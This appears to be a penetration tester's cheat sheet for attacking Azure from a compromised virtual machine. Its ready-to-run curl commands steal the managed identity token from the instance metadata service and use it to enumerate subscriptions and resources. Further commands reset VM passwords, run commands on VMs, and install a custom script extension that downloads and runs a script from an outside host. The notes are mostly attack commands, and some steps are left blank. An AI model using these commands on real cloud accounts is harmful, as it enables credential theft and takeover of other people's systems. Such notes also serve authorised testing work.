#Exploitation Flow 

### 1. Get shell 

### 2. ```env```

### 3. Metadata 

3.1 Get metadata of the azure vm
```
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```
3.2 Get auth token of managed identity
```
curl -H Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
```

### 4. Enum
4.1 Get list of subscriptions
```
curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions?api-version=2020-01-01
```

4.2 List of resource groups and resources
```
curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions/${SUB_ID}/resourcegroups?api-version=2019-10-01
curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2019-10-01 
```

4.3

### Misc useful commands
Get deployment history
```
az deployment group list --resource-group rgname
```

VM password reset 
```
az vm user update -u username -p password -n <VM_Name> -g <Resource_Group>
```

VM run command
```
Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath .\whoami.ps1
```

VM command for 
```
Set-AzVMCustomScriptExtension -ResourceGroupName TEST -VMName PentestVM -Location westcentralus -FileUri 'http://book.azurepentesting.com/whoami.ps1' -Run 'whoami.ps1' -Name CustomScriptExtension
```
